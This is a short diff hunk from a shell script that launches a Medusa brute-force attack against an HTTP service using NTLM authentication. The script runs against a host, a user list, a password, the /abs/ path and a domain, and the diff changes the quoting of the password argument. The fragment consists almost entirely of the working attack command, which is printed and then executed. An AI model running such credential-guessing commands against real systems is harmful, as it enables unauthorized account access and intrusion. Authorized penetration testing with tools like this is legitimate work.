@@ -13,5 +13,4 @@ echo "Executing brute force attack"
 echo ""
 echo "Command:"
 echo "medusa -h $HOST -U $DIR/$USERS -p '$PASSWORD' -M http -m AUTH:NTLM -m DIR:/abs/ -m DOMAIN:$DOMAIN -s"
-
-medusa -h $HOST -U $USERS -p '$PASSWORD' -M http -m AUTH:NTLM -m DIR:/abs/ -m DOMAIN:$DOMAIN -s
+medusa -h $HOST -U $USERS -p \'$PASSWORD\' -M http -m AUTH:NTLM -m DIR:/abs/ -m DOMAIN:$DOMAIN -s
